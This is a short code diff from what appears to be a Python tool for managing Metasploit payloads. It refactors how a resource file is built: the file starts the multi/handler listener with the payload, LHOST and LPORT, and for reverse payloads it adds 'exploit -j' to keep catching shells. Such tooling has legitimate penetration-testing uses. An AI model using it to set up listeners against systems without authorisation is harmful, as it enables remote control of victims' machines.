@@ -46,17 +46,24 @@ class Payload(BaseObject):
     def file_name(self):
         return os.path.basename(self.file_path)
 
-    def write_rc_file(self, fout):
+    @property
+    def rc_file_name(self):
+        return self.file_name.replace('.exe', '.rc')
+
+    def get_rc_file(self):
         ''' Create an rc file that starts the msf handler '''
-        fout.write('use exploit/multi/handler\n')
-        fout.write('set PAYLOAD %s\n' % self.msfpayload)
-        fout.write('set LHOST %s\n' % self.lhost)
-        fout.write('set LPORT %d\n' % self.lport)
+        rc = '''
+use exploit/multi/handler
+set PAYLOAD %s
+set LHOST %s
+set LPORT %d
+''' % (self.msfpayload, self.lhost, self.lport)
         if 'reverse' in self.msfpayload:
-            fout.write('set ExitOnSession false\n')
-            fout.write('exploit -j\n\n')
+            rc += 'set ExitOnSession false\n'
+            rc += 'exploit -j\n\n'
         else:
-            fout.write('exploit\n\n')
+            rc += 'exploit\n\n'
+        return rc
 
     def __str__(self):
     	return "Created: %s | MSFPayload: %s | Port: %d | Download: %s" % (
